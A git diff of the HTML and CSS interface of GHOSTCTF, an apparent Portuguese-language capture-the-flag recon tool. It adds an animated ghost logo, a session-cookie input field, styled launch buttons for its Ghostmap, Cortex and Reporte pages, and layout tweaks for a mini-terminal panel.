@@ -33,6 +33,17 @@
 
   * { margin: 0; padding: 0; box-sizing: border-box; }
 
+  button:focus-visible,
+  input:focus-visible,
+  textarea:focus-visible,
+  select:focus-visible,
+  .run-btn:focus-visible,
+  .export-btn:focus-visible,
+  .mitre-map-btn:focus-visible {
+    outline: 2px solid var(--accent4);
+    outline-offset: 2px;
+  }
+
   body {
     background: var(--bg);
     color: var(--text);
@@ -87,44 +98,129 @@
   .logo {
     display: flex;
     align-items: center;
-    gap: 12px;
+    gap: 10px;
   }
 
-  .logo-icon {
-    width: 36px;
-    height: 36px;
-    border: 1px solid var(--accent);
-    display: grid;
-    place-items: center;
+  .logo-mark {
     position: relative;
-    overflow: hidden;
+    display: flex;
+    align-items: center;
+    min-height: 44px;
   }
 
-  .logo-icon::before {
-    content: '';
+  /** Fantasma por trás do nome (mesmo desenho que no terminal vazio). */
+  .logo-ghost-bg {
     position: absolute;
-    inset: 3px;
-    border: 1px solid var(--accent);
+    left: -10px;
+    top: 50%;
+    transform: translateY(-50%);
+    z-index: 0;
+    pointer-events: none;
     opacity: 0.4;
-    animation: iconPulse 2s ease-in-out infinite;
+    color: rgba(255, 43, 214, 0.92);
+    filter: drop-shadow(0 0 18px rgba(255, 43, 214, 0.28));
+    animation: logo-ghost-float 2.6s ease-in-out infinite;
   }
 
-  @keyframes iconPulse {
-    0%, 100% { transform: scale(1); opacity: 0.4; }
-    50% { transform: scale(0.8); opacity: 0.8; }
+  .logo-ghost-bg svg {
+    display: block;
+    width: 52px;
+    height: 58px;
   }
 
-  .logo-icon svg { width: 18px; height: 18px; fill: var(--accent); }
+  .logo-ghost-bg .logo-gh-anim {
+    transform-origin: 24px 26px;
+    animation: empty-ghost-sway 2.8s ease-in-out infinite;
+  }
+
+  .logo-ghost-bg .logo-gh-eye {
+    transform-origin: center;
+    transform-box: fill-box;
+    animation: empty-ghost-blink 4.5s ease-in-out infinite;
+  }
+
+  .logo-ghost-bg .logo-gh-eye-r {
+    animation-delay: 0.05s;
+  }
+
+  @keyframes logo-ghost-float {
+    0%, 100% { transform: translateY(-50%); }
+    50% { transform: translateY(calc(-50% - 3px)); }
+  }
 
   .logo-text {
+    position: relative;
+    z-index: 1;
+    padding-left: 60px;
     font-family: var(--display);
     font-size: 18px;
     font-weight: 900;
     color: var(--text-bright);
     letter-spacing: 4px;
+    text-shadow: 0 0 24px rgba(0, 0, 0, 0.75), 0 1px 0 rgba(0, 0, 0, 0.9);
   }
 
   .logo-text span { color: var(--accent); }
+
+  /** Fastaminha no terminal — mesma cor que `.empty-ascii` (magenta título). */
+  .empty-ghost-wrap {
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    margin: 2px 0 10px;
+    color: rgba(255, 43, 214, 0.88);
+    filter: drop-shadow(0 0 20px rgba(255, 43, 214, 0.22));
+    animation: empty-ghost-float 2.4s ease-in-out infinite;
+  }
+
+  .empty-ghost-wrap svg {
+    display: block;
+    width: 88px;
+    height: 96px;
+  }
+
+  .empty-ghost-wrap .empty-gh-anim {
+    transform-origin: 24px 26px;
+    animation: empty-ghost-sway 2.4s ease-in-out infinite;
+  }
+
+  .empty-ghost-wrap .empty-gh-eye {
+    transform-origin: center;
+    transform-box: fill-box;
+    animation: empty-ghost-blink 4.5s ease-in-out infinite;
+  }
+
+  .empty-ghost-wrap .empty-gh-eye-r {
+    animation-delay: 0.05s;
+  }
+
+  @keyframes empty-ghost-float {
+    0%, 100% { transform: translateY(0); }
+    50% { transform: translateY(-4px); }
+  }
+
+  @keyframes empty-ghost-sway {
+    0%, 100% { transform: rotate(-4deg); }
+    50% { transform: rotate(4deg); }
+  }
+
+  @keyframes empty-ghost-blink {
+    0%, 48%, 52%, 100% { transform: scaleY(1); }
+    50% { transform: scaleY(0.12); }
+  }
+
+  @media (prefers-reduced-motion: reduce) {
+    .empty-ghost-wrap,
+    .empty-ghost-wrap .empty-gh-anim,
+    .empty-ghost-wrap .empty-gh-eye {
+      animation: none !important;
+    }
+    .logo-ghost-bg,
+    .logo-ghost-bg .logo-gh-anim,
+    .logo-ghost-bg .logo-gh-eye {
+      animation: none !important;
+    }
+  }
 
   .header-status {
     display: flex;
@@ -423,6 +519,466 @@
   @keyframes btnPulse {
     0%, 100% { box-shadow: 0 0 10px rgba(255,43,214,0.3); }
     50% { box-shadow: 0 0 25px rgba(255,43,214,0.6); }
+  }
+
+  /* ===== Hub Ghostmap / Cortex / Reporte (mesmo design que GHOSTRECON) ===== */
+  .mitre-map-btn {
+    width: 100%;
+    min-height: 54px;
+    padding: 0;
+    border: none;
+    background: transparent;
+    cursor: pointer;
+    position: relative;
+    text-align: left;
+    overflow: visible;
+    transition: transform 0.2s ease, filter 0.2s ease;
+  }
+
+  .mitre-map-btn:focus-visible {
+    outline: 2px solid var(--accent4);
+    outline-offset: 3px;
+  }
+
+  .mitre-map-btn:focus-visible .mitre-map-btn-skin {
+    box-shadow:
+      0 0 0 2px rgba(0, 212, 255, 0.5),
+      0 4px 24px rgba(0, 0, 0, 0.45);
+  }
+
+  .mitre-map-btn-skin {
+    position: relative;
+    display: block;
+    width: 100%;
+    min-height: 54px;
+    padding: 2px;
+    border-radius: 2px;
+    background: linear-gradient(
+      135deg,
+      rgba(0, 212, 255, 0.35) 0%,
+      rgba(0, 255, 136, 0.12) 40%,
+      rgba(26, 40, 64, 0.9) 55%,
+      rgba(0, 212, 255, 0.2) 100%
+    );
+    box-shadow:
+      0 0 0 1px rgba(0, 212, 255, 0.15),
+      0 4px 24px rgba(0, 0, 0, 0.45),
+      inset 0 1px 0 rgba(255, 255, 255, 0.04);
+    transition: box-shadow 0.25s ease, background 0.25s ease;
+  }
+
+  .mitre-map-btn-skin::before {
+    content: '';
+    position: absolute;
+    inset: 2px;
+    border-radius: 1px;
+    background:
+      linear-gradient(165deg, rgba(12, 22, 38, 0.98) 0%, rgba(6, 10, 18, 0.99) 45%, rgba(10, 18, 32, 0.97) 100%);
+    pointer-events: none;
+  }
+
+  .mitre-map-btn-shine {
+    position: absolute;
+    inset: 0;
+    border-radius: 2px;
+    background: linear-gradient(
+      105deg,
+      transparent 0%,
+      rgba(0, 212, 255, 0.12) 42%,
+      rgba(0, 255, 136, 0.08) 50%,
+      transparent 58%
+    );
+    transform: translateX(-100%);
+    transition: transform 0.55s ease;
+    pointer-events: none;
+    z-index: 1;
+  }
+
+  .mitre-map-btn-inner {
+    position: relative;
+    z-index: 2;
+    display: flex;
+    align-items: center;
+    gap: 14px;
+    padding: 10px 14px 10px 12px;
+    min-height: 50px;
+  }
+
+  .mitre-map-btn-icon-wrap {
+    flex-shrink: 0;
+    width: 40px;
+    height: 40px;
+    border-radius: 50%;
+    display: grid;
+    place-items: center;
+    background: radial-gradient(circle at 35% 30%, rgba(0, 212, 255, 0.22), transparent 62%),
+      linear-gradient(160deg, rgba(0, 212, 255, 0.07), rgba(0, 255, 136, 0.05));
+    border: 1px solid rgba(0, 212, 255, 0.4);
+    box-shadow: inset 0 0 18px rgba(0, 212, 255, 0.07), 0 0 14px rgba(0, 212, 255, 0.1);
+  }
+
+  .ghostmap-globe-frame {
+    position: relative;
+    overflow: visible;
+    isolation: isolate;
+    display: grid;
+    place-items: center;
+    grid-template: 1fr / 1fr;
+  }
+
+  .ghostmap-globe-frame > * {
+    grid-area: 1 / 1;
+  }
+
+  .ghostmap-orbit {
+    pointer-events: none;
+    position: absolute;
+    left: 50%;
+    top: 50%;
+    width: 44px;
+    height: 44px;
+    margin: -22px 0 0 -22px;
+    border-radius: 50%;
+    box-sizing: border-box;
+    border: 1.5px solid rgba(0, 212, 255, 0.1);
+    border-top-color: rgba(0, 212, 255, 0.88);
+    border-right-color: rgba(0, 212, 255, 0.35);
+    z-index: 0;
+    will-change: transform;
+    animation: ghostmap-orbit-spin 2.75s linear infinite;
+    filter: drop-shadow(0 0 4px rgba(0, 212, 255, 0.35));
+  }
+
+  .ghostmap-orbit--b {
+    width: 52px;
+    height: 52px;
+    margin: -26px 0 0 -26px;
+    border-width: 1px;
+    border-top-color: rgba(130, 220, 255, 0.55);
+    border-right-color: rgba(0, 212, 255, 0.22);
+    border-left-color: rgba(0, 212, 255, 0.08);
+    opacity: 0.9;
+    animation: ghostmap-orbit-spin 4.1s linear infinite reverse;
+    filter: drop-shadow(0 0 5px rgba(0, 180, 255, 0.3));
+  }
+
+  @keyframes ghostmap-orbit-spin {
+    to { transform: rotate(360deg); }
+  }
+
+  .ghostmap-globe-frame .ghostmap-globe-svg {
+    position: relative;
+    z-index: 1;
+  }
+
+  .mitre-map-btn:hover:not(:disabled) .ghostmap-orbit {
+    animation-duration: 2.05s;
+  }
+
+  .mitre-map-btn:hover:not(:disabled) .ghostmap-orbit--b {
+    animation-duration: 3.1s;
+  }
+
+  .mitre-map-btn--ready:not(:disabled) .ghostmap-orbit {
+    border-top-color: rgba(0, 230, 255, 0.95);
+    box-shadow: 0 0 10px rgba(0, 212, 255, 0.2);
+  }
+
+  .mitre-map-btn:disabled .ghostmap-orbit {
+    animation: none;
+    opacity: 0.22;
+    filter: none;
+  }
+
+  @media (prefers-reduced-motion: reduce) {
+    .ghostmap-orbit {
+      animation: none;
+      opacity: 0.35;
+    }
+  }
+
+  .mitre-map-btn-svg {
+    display: block;
+    width: 24px;
+    height: 24px;
+    color: var(--accent4);
+    filter: drop-shadow(0 0 5px rgba(0, 212, 255, 0.45));
+  }
+
+  .ghostmap-globe-svg .ghg-shade {
+    fill: rgba(6, 10, 18, 0.88);
+    stroke: currentColor;
+    stroke-width: 1;
+  }
+
+  .ghostmap-globe-svg .ghg-line {
+    fill: none;
+    stroke: currentColor;
+    stroke-width: 0.42;
+    opacity: 0.48;
+  }
+
+  .ghostmap-globe-svg .ghg-accent {
+    fill: none;
+    stroke: var(--accent2);
+    stroke-width: 0.65;
+    opacity: 0.58;
+  }
+
+  .mitre-map-btn:not(:disabled) .ghostmap-globe-svg .ghg-accent {
+    animation: ghostmap-meridian-shimmer 2.4s ease-in-out infinite;
+  }
+
+  .mitre-map-btn:disabled .ghostmap-globe-svg .ghg-accent {
+    animation: none;
+  }
+
+  @keyframes ghostmap-meridian-shimmer {
+    0%, 100% {
+      opacity: 0.42;
+      stroke: var(--accent2);
+    }
+    50% {
+      opacity: 0.88;
+      stroke: rgba(0, 212, 255, 0.95);
+    }
+  }
+
+  @media (prefers-reduced-motion: reduce) {
+    .mitre-map-btn:not(:disabled) .ghostmap-globe-svg .ghg-accent {
+      animation: none;
+      opacity: 0.55;
+    }
+  }
+
+  .mitre-map-btn.cortex-btn .mitre-map-btn-skin {
+    background: linear-gradient(
+      135deg,
+      rgba(180, 120, 255, 0.36) 0%,
+      rgba(100, 70, 200, 0.14) 42%,
+      rgba(26, 40, 64, 0.9) 58%,
+      rgba(160, 100, 255, 0.2) 100%
+    );
+    box-shadow:
+      0 0 0 1px rgba(150, 110, 255, 0.22),
+      0 4px 24px rgba(0, 0, 0, 0.45),
+      inset 0 1px 0 rgba(255, 255, 255, 0.04);
+  }
+  .mitre-map-btn.cortex-btn:focus-visible {
+    outline-color: rgba(190, 150, 255, 0.9);
+  }
+  .mitre-map-btn.cortex-btn .mitre-map-btn-icon-wrap {
+    background: radial-gradient(circle at 35% 30%, rgba(210, 170, 255, 0.26), transparent 62%),
+      linear-gradient(160deg, rgba(130, 90, 210, 0.12), rgba(60, 30, 120, 0.08));
+    border-color: rgba(170, 120, 255, 0.42);
+    box-shadow: inset 0 0 18px rgba(130, 90, 200, 0.08), 0 0 14px rgba(120, 70, 200, 0.12);
+  }
+  .mitre-map-btn.cortex-btn .ghostmap-orbit--a {
+    border-top-color: rgba(200, 160, 255, 0.9);
+    border-right-color: rgba(150, 100, 220, 0.38);
+    filter: drop-shadow(0 0 4px rgba(150, 100, 255, 0.32));
+  }
+  .mitre-map-btn.cortex-btn .ghostmap-orbit--b {
+    border-top-color: rgba(140, 200, 255, 0.48);
+    border-right-color: rgba(170, 130, 255, 0.22);
+    filter: drop-shadow(0 0 5px rgba(110, 70, 190, 0.26));
+  }
+  .mitre-map-btn.cortex-btn .cortex-svg {
+    display: block;
+    width: 24px;
+    height: 24px;
+    color: rgba(200, 165, 255, 0.98);
+    filter: drop-shadow(0 0 6px rgba(160, 100, 255, 0.4));
+  }
+  .mitre-map-btn.cortex-btn .cortex-svg .ghb-graph {
+    stroke: currentColor;
+  }
+  .mitre-map-btn.cortex-btn .cortex-svg .ghb-edge {
+    stroke-width: 1.05;
+    opacity: 0.5;
+  }
+  .mitre-map-btn.cortex-btn .cortex-svg .ghb-node {
+    fill: rgba(14, 10, 24, 0.95);
+    stroke-width: 1.05;
+  }
+  .mitre-map-btn.cortex-btn .cortex-svg .ghb-hub {
+    fill: rgba(10, 8, 18, 0.98);
+    stroke: rgba(126, 232, 192, 0.65);
+    stroke-width: 1.15;
+  }
+
+  .hub-actions-wrap {
+    display: flex;
+    flex-direction: column;
+    gap: 10px;
+    margin-bottom: 10px;
+    margin-top: 10px;
+  }
+  .hub-actions-row-mitre {
+    display: flex;
+    width: 100%;
+  }
+  .hub-actions-row-mitre .mitre-map-btn.reporte-hub-btn {
+    width: 100%;
+    flex: 1 1 auto;
+  }
+  .reporte-hub-svg {
+    display: block;
+    width: 24px;
+    height: 24px;
+    color: var(--accent4);
+    filter: drop-shadow(0 0 5px rgba(0, 212, 255, 0.45));
+  }
+  .mitre-map-btn.reporte-hub-btn .mitre-map-btn-title {
+    text-shadow: 0 0 22px rgba(0, 255, 136, 0.18);
+  }
+
+  .mitre-map-btn-copy {
+    flex: 1;
+    min-width: 0;
+    display: flex;
+    flex-direction: column;
+    justify-content: center;
+    gap: 0;
+  }
+
+  .mitre-map-btn-title {
+    font-family: var(--display);
+    font-size: 13px;
+    font-weight: 700;
+    letter-spacing: 0.12em;
+    text-transform: uppercase;
+    color: var(--text-bright);
+    line-height: 1.15;
+    text-shadow: 0 0 24px rgba(0, 212, 255, 0.25);
+  }
+
+  .mitre-map-btn-aside {
+    flex-shrink: 0;
+    display: flex;
+    flex-direction: column;
+    align-items: flex-end;
+    gap: 6px;
+  }
+
+  .mitre-map-btn-live {
+    display: inline-flex;
+    align-items: center;
+    gap: 5px;
+    font-family: var(--mono);
+    font-size: 8px;
+    letter-spacing: 0.18em;
+    text-transform: uppercase;
+    color: var(--text-dim);
+    padding: 3px 7px;
+    border: 1px solid rgba(74, 96, 128, 0.5);
+    background: rgba(0, 0, 0, 0.25);
+  }
+
+  .mitre-map-btn-live-dot {
+    width: 6px;
+    height: 6px;
+    border-radius: 50%;
+    background: var(--text-dim);
+    box-shadow: none;
+  }
+
+  .mitre-map-btn-arrow {
+    font-size: 18px;
+    line-height: 1;
+    color: var(--accent4);
+    opacity: 0.85;
+    text-shadow: 0 0 12px rgba(0, 212, 255, 0.45);
+    transition: transform 0.2s ease, opacity 0.2s ease;
+  }
+
+  .mitre-map-btn:hover:not(:disabled) .mitre-map-btn-arrow {
+    transform: translate(2px, -2px);
+    opacity: 1;
+  }
+
+  .mitre-map-btn:hover:not(:disabled) .mitre-map-btn-shine {
+    transform: translateX(100%);
+  }
+
+  .mitre-map-btn:hover:not(:disabled) {
+    transform: translateY(-2px);
+  }
+
+  .mitre-map-btn:hover:not(:disabled) .mitre-map-btn-skin {
+    box-shadow:
+      0 0 0 1px rgba(0, 212, 255, 0.45),
+      0 0 28px rgba(0, 212, 255, 0.2),
+      0 8px 32px rgba(0, 0, 0, 0.5),
+      inset 0 1px 0 rgba(255, 255, 255, 0.07);
+  }
+
+  .mitre-map-btn:active:not(:disabled) {
+    transform: translateY(0) scale(0.992);
+  }
+
+  .mitre-map-btn:disabled {
+    cursor: not-allowed;
+    filter: grayscale(0.35) brightness(0.88);
+  }
+
+  .mitre-map-btn:disabled .mitre-map-btn-skin {
+    background: linear-gradient(135deg, rgba(60, 70, 86, 0.35), rgba(30, 36, 48, 0.5));
+    box-shadow: 0 0 0 1px rgba(74, 96, 128, 0.25), 0 2px 12px rgba(0, 0, 0, 0.35);
+  }
+
+  .mitre-map-btn:disabled .mitre-map-btn-title {
+    color: var(--text-dim);
+    text-shadow: none;
+  }
+
+  .mitre-map-btn:disabled .mitre-map-btn-icon-wrap {
+    border-color: rgba(74, 96, 128, 0.45);
+    box-shadow: none;
+    background: rgba(0, 0, 0, 0.2);
+  }
+
+  .mitre-map-btn:disabled .mitre-map-btn-svg {
+    color: var(--text-dim);
+    filter: none;
+  }
+
+  .mitre-map-btn--ready:not(:disabled) .mitre-map-btn-live {
+    border-color: rgba(0, 255, 136, 0.45);
+    color: var(--accent2);
+    background: rgba(0, 255, 136, 0.06);
+  }
+
+  .mitre-map-btn--ready:not(:disabled) .mitre-map-btn-live-dot {
+    background: var(--accent2);
+    box-shadow: 0 0 10px rgba(0, 255, 136, 0.75);
+    animation: mitre-live-pulse 1.6s ease-in-out infinite;
+  }
+
+  @keyframes mitre-live-pulse {
+    0%, 100% { opacity: 1; transform: scale(1); }
+    50% { opacity: 0.65; transform: scale(0.92); }
+  }
+
+  .mitre-map-btn--ready:not(:disabled) .mitre-map-btn-skin {
+    animation: mitre-ready-glow 3s ease-in-out infinite;
+  }
+
+  @keyframes mitre-ready-glow {
+    0%, 100% {
+      box-shadow:
+        0 0 0 1px rgba(0, 212, 255, 0.25),
+        0 0 18px rgba(0, 255, 136, 0.08),
+        0 4px 24px rgba(0, 0, 0, 0.45),
+        inset 0 1px 0 rgba(255, 255, 255, 0.05);
+    }
+    50% {
+      box-shadow:
+        0 0 0 1px rgba(0, 255, 136, 0.35),
+        0 0 26px rgba(0, 212, 255, 0.15),
+        0 4px 28px rgba(0, 0, 0, 0.5),
+        inset 0 1px 0 rgba(255, 255, 255, 0.06);
+    }
   }
 
   /* ===== MODULES SECTION ===== */
@@ -733,9 +1289,12 @@
     display: flex;
     flex-direction: column;
     gap: 8px;
+    min-height: 0;
   }
 
   .shell-mini-panel .shell-bridge-out-wrap {
+    flex: 1;
+    min-height: 0;
     max-height: 220px;
     overflow: auto;
     background: var(--bg);
@@ -747,6 +1306,25 @@
     line-height: 1.45;
     white-space: pre-wrap;
     word-break: break-all;
+  }
+
+  /* Com mini-terminal aberto: metade do painel para nc, metade para logs (mesma área útil). */
+  .terminal.terminal--shell-split .shell-mini-panel {
+    flex: 1;
+    min-height: 120px;
+    max-height: none;
+    margin-bottom: 0;
+  }
+
+  .terminal.terminal--shell-split .shell-mini-panel .shell-bridge-out-wrap {
+    flex: 1;
+    max-height: none;
+    min-height: 120px;
+  }
+
+  .terminal.terminal--shell-split .terminal-scroll {
+    flex: 1;
+    min-height: 120px;
   }
 
   .shell-bridge-out-wrap .sb-err { color: var(--accent4); }
@@ -998,6 +1576,33 @@
   }
 
   .help-modal-body ol li { margin-bottom: 8px; }
+
+  .index-flag-manual-field { margin-bottom: 12px; }
+  .index-flag-manual-field label {
+    display: block;
+    font-family: var(--mono);
+    font-size: 9px;
+    letter-spacing: 1px;
+    text-transform: uppercase;
+    color: var(--accent4);
+    margin-bottom: 5px;
+  }
+  .index-flag-manual-field input,
+  .index-flag-manual-field select,
+  .index-flag-manual-field textarea {
+    width: 100%;
+    box-sizing: border-box;
+    font-family: var(--mono);
+    font-size: 11px;
+    padding: 8px 10px;
+    border: 1px solid var(--border);
+    background: var(--bg);
+    color: var(--text);
+    border-radius: 2px;
+  }
+  .index-flag-manual-field textarea { min-height: 52px; resize: vertical; }
+  .index-flag-manual-actions { margin-top: 14px; display: flex; justify-content: flex-end; gap: 10px; flex-wrap: wrap; }
+  .index-flag-manual-actions .export-btn { padding: 8px 14px; font-size: 10px; }
 
   .help-modal-close {
     position: absolute;
@@ -1325,10 +1930,30 @@
 <!-- HEADER -->
 <header class="header">
   <div class="logo">
-    <div class="logo-icon">
-      <svg viewBox="0 0 24 24"><path d="M12 2L2 7l10 5 10-5-10-5zM2 17l10 5 10-5M2 12l10 5 10-5"/></svg>
+    <div class="logo-mark">
+      <div class="logo-ghost-bg" aria-hidden="true" title="Fastaminha">
+        <svg viewBox="0 0 48 52" xmlns="http://www.w3.org/2000/svg" width="52" height="58" focusable="false" aria-hidden="true">
+          <g class="logo-gh-anim">
+            <path
+              fill="currentColor"
+              fill-opacity="0.92"
+              stroke="currentColor"
+              stroke-opacity="0.42"
+              stroke-width="0.55"
+              d="M 24 5 C 13 5 5 13.5 5 24.5 V 40 Q 8.5 36.5 12 40 Q 15.5 36.5 19 40 Q 22.5 36.5 26 40 Q 29.5 36.5 33 40 Q 36.5 36.5 40 40 Q 43.5 36.5 43 40 V 24.5 C 43 13.5 35 5 24 5 Z"
+            />
+            <path
+              fill="#ffffff"
+              fill-opacity="0.14"
+              d="M 24 8 C 15 8 9 15 9 23.5 V 33 Q 16 28 24 32 Q 32 28 39 33 V 23.5 C 39 15 33 8 24 8 Z"
+            />
+            <ellipse class="logo-gh-eye" cx="17" cy="22" rx="3.2" ry="4.2" fill="#050508" />
+            <ellipse class="logo-gh-eye logo-gh-eye-r" cx="31" cy="22" rx="3.2" ry="4.2" fill="#050508" />
+          </g>
+        </svg>
+      </div>
+      <div class="logo-text">GHOST<span>CTF</span></div>
     </div>
-    <div class="logo-text">GHOST<span>CTF</span></div>
   </div>
   <div class="header-status">
     <div class="status-dot"><div class="dot"></div><span id="statusText">SISTEMA PRONTO</span></div>
@@ -1359,6 +1984,30 @@
         <span class="input-prefix">$</span>
         <input class="domain-input" id="domainInput" type="text" placeholder="IP (ex.: 1.2.3.4)" autocomplete="off" spellcheck="false">
       </div>
+      <div class="toggle-row" style="margin-top:10px;margin-bottom:0">
+        <span class="toggle-label" id="httpSessionCookieLabel" style="flex:1;padding-right:10px;line-height:1.35">Cookie (pós-login)</span>
+        <label class="toggle" title="Ligar para mostrar o campo e colar o Cookie deste run">
+          <input
+            type="checkbox"
+            id="httpSessionCookieToggle"
+            aria-controls="httpSessionCookieWrap"
+            aria-expanded="false"
+            aria-labelledby="httpSessionCookieLabel"
+          />
+          <div class="toggle-track"><div class="toggle-thumb"></div></div>
+        </label>
+      </div>
+      <div id="httpSessionCookieWrap" style="display:none;margin-top:8px;margin-bottom:10px">
+        <textarea
+          id="httpSessionCookieInput"
+          rows="2"
+          placeholder="Cabeçalho Cookie completo (ex.: sessionid=abc; csrftoken=…) — só este run; curl usa -b. Alternativa: GHOSTCTF_HTTP_COOKIE no .env do servidor."
+          autocomplete="off"
+          spellcheck="false"
+          aria-labelledby="httpSessionCookieLabel"
+          style="width:100%;min-height:44px;background:var(--bg);border:1px solid var(--border);color:var(--text);font-family:var(--mono);font-size:10px;padding:8px;resize:vertical"
+        ></textarea>
+      </div>
 
       <div id="kaliPanel" style="display:none;margin-bottom:14px;padding:12px;border:1px solid var(--border);background:var(--bg2)">
         <div class="section-label" style="margin-bottom:8px">Kali (scan ativo)</div>
@@ -1378,10 +2027,120 @@
         <div class="progress-pct" id="progressPct">0%</div>
       </div>
 
-      <button class="run-btn" id="runBtn" onclick="startRecon()">▶ RUN GHOSTCTF</button>
-      <div id="decodeQuickModuleCard" class="sidebar-payload-card" style="margin-top:10px;border:1px solid var(--border);padding:10px;background:var(--bg2)">
+      <div class="hub-actions-wrap">
+        <div style="display:flex;flex-wrap:wrap;gap:10px;align-items:center">
+          <button class="run-btn" id="runBtn" onclick="startRecon()">▶ RUN GHOSTCTF</button>
+          <button
+            type="button"
+            class="mitre-map-btn"
+            id="mitreMapBtn"
+            title="Abre o Ghostmap (MITRE ao vivo) noutra aba — com recon activo, recebe eventos por BroadcastChannel."
+            aria-label="Abrir Ghostmap — mapa MITRE ao vivo (nova aba)"
+            onclick="openMitreMapPage()"
+          >
+            <span class="mitre-map-btn-skin" aria-hidden="true">
+              <span class="mitre-map-btn-shine"></span>
+              <span class="mitre-map-btn-inner">
+                <span class="mitre-map-btn-icon-wrap ghostmap-globe-frame">
+                  <span class="ghostmap-orbit ghostmap-orbit--a" aria-hidden="true"></span>
+                  <span class="ghostmap-orbit ghostmap-orbit--b" aria-hidden="true"></span>
+                  <svg class="mitre-map-btn-svg ghostmap-globe-svg" viewBox="0 0 24 24" aria-hidden="true" focusable="false">
+                    <circle class="ghg-shade" cx="12" cy="12" r="9.25" />
+                    <ellipse class="ghg-line" cx="12" cy="12" rx="9.25" ry="9.25" fill="none" />
+                    <ellipse class="ghg-line" cx="12" cy="12" rx="5.5" ry="9.25" fill="none" />
+                    <ellipse class="ghg-line" cx="12" cy="12" rx="2.8" ry="9.25" fill="none" />
+                    <path class="ghg-accent" fill="none" d="M3.2 12h17.6" stroke-linecap="round" />
+                    <path class="ghg-accent" fill="none" d="M12 2.9c2.8 2.5 4.6 6.1 4.6 9.1s-1.8 6.6-4.6 9.1" stroke-linecap="round" />
+                    <path class="ghg-accent" fill="none" d="M12 2.9c-2.8 2.5-4.6 6.1-4.6 9.1s1.8 6.6 4.6 9.1" stroke-linecap="round" />
+                  </svg>
+                </span>
+                <span class="mitre-map-btn-copy">
+                  <span class="mitre-map-btn-title">Ghostmap</span>
+                </span>
+                <span class="mitre-map-btn-aside">
+                  <span class="mitre-map-btn-live"><span class="mitre-map-btn-live-dot"></span> sessão</span>
+                  <span class="mitre-map-btn-arrow" aria-hidden="true">↗</span>
+                </span>
+              </span>
+            </span>
+          </button>
+          <button
+            type="button"
+            class="mitre-map-btn cortex-btn"
+            id="cortexBtn"
+            title="Cortex — grafo de conhecimento (SQLite). Shift+clique: modo demo (?demo=1)."
+            aria-label="Abrir Cortex (nova aba)"
+            onclick="openCortexPage(event)"
+          >
+            <span class="mitre-map-btn-skin" aria-hidden="true">
+              <span class="mitre-map-btn-shine"></span>
+              <span class="mitre-map-btn-inner">
+                <span class="mitre-map-btn-icon-wrap ghostmap-globe-frame">
+                  <span class="ghostmap-orbit ghostmap-orbit--a" aria-hidden="true"></span>
+                  <span class="ghostmap-orbit ghostmap-orbit--b" aria-hidden="true"></span>
+                  <svg class="cortex-svg" viewBox="0 0 24 24" aria-hidden="true" focusable="false">
+                    <g class="ghb-graph" fill="none" stroke-linecap="round" stroke-linejoin="round">
+                      <line class="ghb-edge" x1="12" y1="12" x2="12" y2="5.25" />
+                      <line class="ghb-edge" x1="12" y1="12" x2="18.45" y2="9.15" />
+                      <line class="ghb-edge" x1="12" y1="12" x2="15.9" y2="17.85" />
+                      <line class="ghb-edge" x1="12" y1="12" x2="8.1" y2="17.85" />
+                      <line class="ghb-edge" x1="12" y1="12" x2="5.55" y2="9.15" />
+                      <circle class="ghb-node" cx="12" cy="4.85" r="1.95" />
+                      <circle class="ghb-node" cx="18.75" cy="8.95" r="1.75" />
+                      <circle class="ghb-node" cx="16.15" cy="18.35" r="1.75" />
+                      <circle class="ghb-node" cx="7.85" cy="18.35" r="1.75" />
+                      <circle class="ghb-node" cx="5.25" cy="8.95" r="1.75" />
+                      <circle class="ghb-hub" cx="12" cy="12" r="3.25" />
+                    </g>
+                  </svg>
+                </span>
+                <span class="mitre-map-btn-copy">
+                  <span class="mitre-map-btn-title">Cortex</span>
+                </span>
+                <span class="mitre-map-btn-aside">
+                  <span class="mitre-map-btn-live"><span class="mitre-map-btn-live-dot"></span> grafo</span>
+                  <span class="mitre-map-btn-arrow" aria-hidden="true">↗</span>
+                </span>
+              </span>
+            </span>
+          </button>
+        </div>
+        <div class="hub-actions-row-mitre">
+          <button
+            type="button"
+            class="mitre-map-btn reporte-hub-btn"
+            id="reporteHubBtn"
+            title="Checklist manual + SQLite + relatório IA. Abre com os achados da sessão."
+            aria-label="Abrir Reporte — nova aba"
+            onclick="openReportePage()"
+          >
+            <span class="mitre-map-btn-skin" aria-hidden="true">
+              <span class="mitre-map-btn-shine"></span>
+              <span class="mitre-map-btn-inner">
+                <span class="mitre-map-btn-icon-wrap ghostmap-globe-frame">
+                  <span class="ghostmap-orbit ghostmap-orbit--a" aria-hidden="true"></span>
+                  <span class="ghostmap-orbit ghostmap-orbit--b" aria-hidden="true"></span>
+                  <svg class="reporte-hub-svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false">
+                    <path d="M9 5H7a2 2 0 00-2 2v12a2 2 0 002 2h10a2 2 0 002-2V7a2 2 0 00-2-2h-2" />
+                    <rect x="9" y="3" width="6" height="4" rx="1" />
+                    <path d="M9 12h6M9 16h6" />
+                  </svg>
+                </span>
+                <span class="mitre-map-btn-copy">
+                  <span class="mitre-map-btn-title">Reporte</span>
+                </span>
+                <span class="mitre-map-btn-aside">
+                  <span class="mitre-map-btn-live"><span class="mitre-map-btn-live-dot"></span> checklist</span>
+                  <span class="mitre-map-btn-arrow" aria-hidden="true">↗</span>
+                </span>
+              </span>
+            </span>
+          </button>
+        </div>
+      </div>
+      <div id="decodeQuickModuleCard" class="sidebar-payload-card sidebar-module-off" style="margin-top:10px;border:1px solid var(--border);padding:10px;background:var(--bg2)">
         <div class="section-label section-label--with-help" style="margin-bottom:8px">
-          <button type="button" class="sidebar-module-toggle" id="decodeQuickModuleToggle" onclick="toggleSidebarPayloadModule('decodeQuick')" aria-expanded="true" aria-controls="decodeQuickModuleBody" title="Mostrar ou ocultar conteúdo">ON</button>
+          <button type="button" class="sidebar-module-toggle" id="decodeQuickModuleToggle" onclick="toggleSidebarPayloadModule('decodeQuick')" aria-expanded="false" aria-controls="decodeQuickModuleBody" title="Mostrar ou ocultar conteúdo">OFF</button>
           <span class="section-label-heading">Decode rápido (Base64/Base32)</span>
           <button type="button" class="findings-help-btn" id="decodeHelpBtn" aria-label="Ajuda: decode rápido" title="Ajuda: decode rápido">?</button>
           <span class="section-label-rule" aria-hidden="true"></span>
@@ -1396,9 +2155,9 @@
         </div>
       </div>
 
